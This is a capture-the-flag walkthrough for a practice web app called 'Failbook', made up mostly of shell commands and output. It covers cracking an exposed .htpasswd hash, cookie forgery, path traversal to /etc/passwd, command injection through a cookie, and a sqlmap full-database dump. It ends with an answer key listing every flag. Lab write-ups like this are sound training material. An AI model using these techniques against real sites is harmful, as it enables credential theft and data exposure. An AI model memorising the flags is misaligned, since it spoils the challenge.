@@ -1,0 +1,259 @@
+Failbook Challenge Writeups
+
+This walkthrough offers only one way to solve the Failbook challenges. There are many tools and ways to solve these challenges.
+
+Flag 1:
+    
+    $ nikto -h https://failbook.com/
+		+ "robots.txt" contains 6 entries which should be manually viewed.
+
+	$ curl -k "https://failbook.com/robots.txt"
+		User-agent: *
+		Disallow: /admin.php
+		Disallow: /secret.php
+		Disallow: /test.php
+		Disallow: /cat.php
+		Disallow: /admin/*
+		Allow: /
+		
+	$ curk -k "https://failbook.com/admin/"
+		... 401 Unauthorized ...
+		
+	$ curl -k "https://failbook.com/.htpasswd"
+		flaguser:aZYOoJ4izPiUo
+		
+	$ echo "flaguser:aZYOoJ4izPiUo" >> /tmp/htpasswd
+	
+	$ john /tmp/htpasswd
+	
+	$ john /tmp/htpasswd --show | head -n 1
+		flaguser:pass123
+		
+	$ curl --user "flaguser:pass123" "https://failbook.com/admin/"
+		flag.php
+
+	$ curl --user "flaguser:pass123" "https://failbook.com/admin/flag.php"
+		... <!-- Flag 1: V2hhdCB3YXMgb25jZSBzZWNyZXQsIGlzIGtub3duIQo= ... --> ...
+
+	$ echo "V2hhdCB3YXMgb25jZSBzZWNyZXQsIGlzIGtub3duIQo=" | base64 -d
+		What was once secret, is known!
+		
+Flag 2:
+
+	$ nikto -h https://failbook.com/
+		+ "robots.txt" contains 6 entries which should be manually viewed.
+
+	$ curl -k "https://failbook.com/secret.php"
+		Redirected to login.php, So we need to login first
+		
+	$ curl -d "fname=user&lname=name&username=user&password=pass&pconfirm=pass" http://failbook.com/register.php
+		
+	$ curl -c /tmp/cookie.txt -d “username=user&pass=pass” http://failbook.com/login.php
+		
+	$ curl -b /tmp/cookie.txt http://failbook.com/secret.php
+		Not Authorized
+
+	$ curl -D /tmp/secret_cookies -d "username=user&password=pass" http://failbook.com/secret.php
+
+	$ less /tmp/secret_cookies
+		admin=0
+	
+	$ curl -b /tmp/cookie.txt -b "admin=1" https://failbook.com/secret.php
+		... Flag2: U3BlYWsgZnJpZW5kIGFuZCBlbnRlcgo= ...
+		
+	$ echo "U3BlYWsgZnJpZW5kIGFuZCBlbnRlcgo=" | base64 -d
+		Speak friend and enter
+		
+Flag 3:
+		
+	$ Log into your user account
+	
+	$ Navigate to https://failbook.com/admin.php
+		unauthorized.php
+		
+	$ Log out and visit the password reset page
+		If you previously inspected the source of the registration page, you will notice that the security question portion is commented out. However, on the password rest page, it asks for one. 
+		
+		This is a problem for the web app devloper, but gives us the ability to reset any users password as long aswe know their name and user information.
+		
+		Go ahead and enter in the following information:
+			First Name: tom
+			Last Name: 	anderson
+			Username: 	tom
+			Password: 	* Whatever you want it to be *
+			Answer:		* Whatever you want as this is not checked *
+			
+	$ Log in as Tom
+	
+	$ Navigate to https://failbook.com/admin.php
+		flaguser	flag	user	Flag3: WW91IHdpbiBzb21lIGFuZCBZb3UgbG9zZSBzb21lLgo=
+		
+	$ echo "Flag3: WW91IHdpbiBzb21lIGFuZCBZb3UgbG9zZSBzb21lLgo=" | base64 -d
+		You win some and You lose some.
+		
+Flag 4:
+
+	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://192.168.1.134/login.php
+
+	$ curl -b /tmp/cookie.txt http://192.168.1.134/test.php
+		Nothing, Maybe Cookies?
+
+	$ curl -b /tmp/cookie.txt -D /tmp/cookie_info.txt http://192.168.1.134/test.php
+
+	$ cat /tmp/cookie_info.txt
+		... Set-Cookie: TEMPLATE=template.php ...
+
+	$ curl -b /tmp/cookie.txt -b "TEMPLATE=../../../etc/passwd"http://192.168.1.134/test.php
+		So, we know flag four must be in a file somewhere, but where?
+
+		There are several ways to find the flag four file, even
+		piggybacking on other challenges
+
+	$ curl -b /tmp/cookie.txt -b "TEMPLATE=/var/www2/flag4.txt" http://192.168.1.134/test.php
+		... Flag 4: VGhhdCB3YXMgZWFzaWVyIHRoYW50IEkgdGhvdWdodC4K ...
+
+	$ echo "VGhhdCB3YXMgZWFzaWVyIHRoYW50IEkgdGhvdWdodC4K" | base64 -d
+		That was easier thant I thought.
+		
+Flag 5:	
+	
+	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://192.168.1.134/login.php
+
+	$ curl -b /tmp/cookie.txt http://192.168.1.134/cat.php
+		Nothing too apparent in the output, maybe cookies?
+
+	$ curl -b /tmp/cookie.txt -D /tmp/cookie_info.txt http://192.168.1.134/cat.php
+
+	$ cat /tmp/cookie_info.txt
+		... Set-Cookie: command=%2Fbin%2Fbash+%2Fvar%2Fwww%2Fscripts%2Fcat.sh ...
+		
+		Decoded: command=/bin/bash/ /var/www/scripts/cat.sh
+
+	$ curl -b /tmp/cookie.txt -b "command=ls -la" http://192.168.1.134/cat.php
+		... <ls output omitted> ...
+
+	$ curl -b /tmp/cookies.txt -b "command=grep -r 'Flag:' /"
+		Not ideal, but you can play around with grep and try to find the flags.
+		Once you find the name syntax of flag#.txt, you can try to find those files.
+
+	$ curl -b /tmp/cookie.txt -b "command=/bin/cat /home/failbook/flag5.txt" http://192.168.1.134/test.php
+		... Flag 5: WW91IGdvdHRhIGxvdmUgQ29tbWFuZCBJbmplY3Rpb24hCg== ...
+		
+	$ echo "WW91IGdvdHRhIGxvdmUgQ29tbWFuZCBJbmplY3Rpb24hCg==" | base64 -d
+		You gotta love Command Injection!
+		
+Flag 6:
+
+	Piggybacking on challenge 5, we find a flag directory, but it appears to be empty. However, what if the file is hidden?
+	
+	Use Challenge 5 to run, 'ls -la' on the flag directory
+		.flag6.php
+		
+	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://192.168.1.134/login.php
+
+	$ curl -b /tmp/cookie.txt http://192.168.1.134/failbook/.flag6.php
+		You must connect using 'Failbook v1.0'!
+		Hmm, User Agent?
+
+	$ curl -b /tmp/cookie.txt -A “Failbook v1.0” http://192.168.1.134/failbook/.flag6.php
+		Flag 6: TmV2ZXIgZm9yZ2V0IHRoZSBVc2VyIEFnZW50IFN0cmluZwo=
+		
+	$ echo "TmV2ZXIgZm9yZ2V0IHRoZSBVc2VyIEFnZW50IFN0cmluZwo=" | base64 -d
+		Never forget the User Agent String
+		
+Flag 7:
+
+	Obtainable by logging into the page. It should be the top post. If not, you can use the post search to find it.
+	
+	$ echo "QSBtaW5kIGlzIGEgdGVycmlibGUgdGhpbmcgdG8gd2FzdGUK" | base64 -d 
+		A mind is a terrible thing to waste
+		
+Flag 8:
+
+	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://192.168.1.134/login.php
+
+	$ curl -b /tmp/cookie.txt -b "TEMPLATE=../../../etc/passwd" http://192.168.1.134/test.php
+		... Flag 8: Rmx5LCB5b3UgZm9vbHMuCg== ...
+		
+	$ echo "Rmx5LCB5b3UgZm9vbHMuCg==" | base64 -d
+		Fly, you fools.
+		
+Flag 9:
+
+	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://192.168.1.134/login.php
+
+	$ curl -b /tmp/cookie.txt -b "command=md5sum /root/flag9.ssh.key" http://192.168.1.134/cat.php
+		No dice, we are running as the apache user (www-data) and cannot access /root/
+		So now what? Find an exploit and attack the host. Once you do, you’ll get the flag of: e078c4b6febfe1732b9c7c3f7acac4ac
+		
+Flag 10:
+
+	$ sqlmap -u "http://192.168.1.134/search.php?text=l" --cookie="PHPSESSID=0tauelnjclqhsa7haiunreabu2" --dump-all --risk 3 --level 3
+		$ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+		$ for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
+		$ GET parameter 'text' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+		
+		In the results you will see a flags table with flag 10.
+		
+		Flag 10: QWx3YXlzIGxvb2sgbGVmdCBhbmQgcmlnaHQuCg==
+		
+	$ echo "QWx3YXlzIGxvb2sgbGVmdCBhbmQgcmlnaHQuCg==" | base64 -d 
+		Always look left and right.
+		
+Flag 11:
+
+	Under Construction - Will be added shortly
+	
+Flag 12:
+
+	Under Construction - Will be added shortly
+	
+Flag 13: 
+
+	Find the processList.php file. In the output, you should see:
+		vi Flag 13: WW91J3ZlIGdvdCBtYWlsCg==.txt
+		
+	$ echo "WW91J3ZlIGdvdCBtYWlsCg==" | base64 -d 
+		You've got mail
+		
+Flag 14: 
+
+	From your 'ls' earlier, you may have found /var/www/flag.php.inc
+		Using Challenge 5 or another way, you should be able to get the contents
+		from this file
+		
+		Flag 14: RG9uJ3Qgd29ycnksIEJlIGhhcHB5Cg==
+		
+	$ echo "RG9uJ3Qgd29ycnksIEJlIGhhcHB5Cg==" | base64 -d 
+		Don't worry, Be happy
+		
+Flag 15:
+
+	Find process.php and examine the Javascript code.
+	
+	Work your way through the code and determine the flag value.
+	
+	Or you can just do the following in the browser url bar:
+		javascript: document.write(password);
+		
+	You should get the value of 253545356524954515450555352515451545357
+	
+	You can test that you have the correct value by entering tom asthe user and the above string as the password. If you are correct, it should alert a success message.
+
+Complete Flag List:
+
+	V2hhdCB3YXMgb25jZSBzZWNyZXQsIGlzIGtub3duIQo=		# Flag 1	
+	U3BlYWsgZnJpZW5kIGFuZCBlbnRlcgo=			# Flag 2
+	WW91IHdpbiBzb21lIGFuZCBZb3UgbG9zZSBzb21lLgo=		# Flag 3
+	VGhhdCB3YXMgZWFzaWVyIHRoYW50IEkgdGhvdWdodC4K		# Flag 4
+	WW91IGdvdHRhIGxvdmUgQ29tbWFuZCBJbmplY3Rpb24hCg==	# Flag 5
+	TmV2ZXIgZm9yZ2V0IHRoZSBVc2VyIEFnZW50IFN0cmluZwo=	# Flag 6
+	QSBtaW5kIGlzIGEgdGVycmlibGUgdGhpbmcgdG8gd2FzdGUK	# Flag 7
+	Rmx5LCB5b3UgZm9vbHMuCg==				# Flag 8
+	e078c4b6febfe1732b9c7c3f7acac4ac			# Flag 9
+	QWx3YXlzIGxvb2sgbGVmdCBhbmQgcmlnaHQuCg==		# Flag 10
+	U2F5IG5vIHRvIGZsYWdzCg==				# Flag 11
+	c2FyY2FzdGFiYWxsCg==					# Flag 12
+	WW91J3ZlIGdvdCBtYWlsCg==				# Flag 13
+	RG9uJ3Qgd29ycnksIEJlIGhhcHB5Cg==			# Flag 14
+	253545356524954515450555352515451545357			# Flag 15
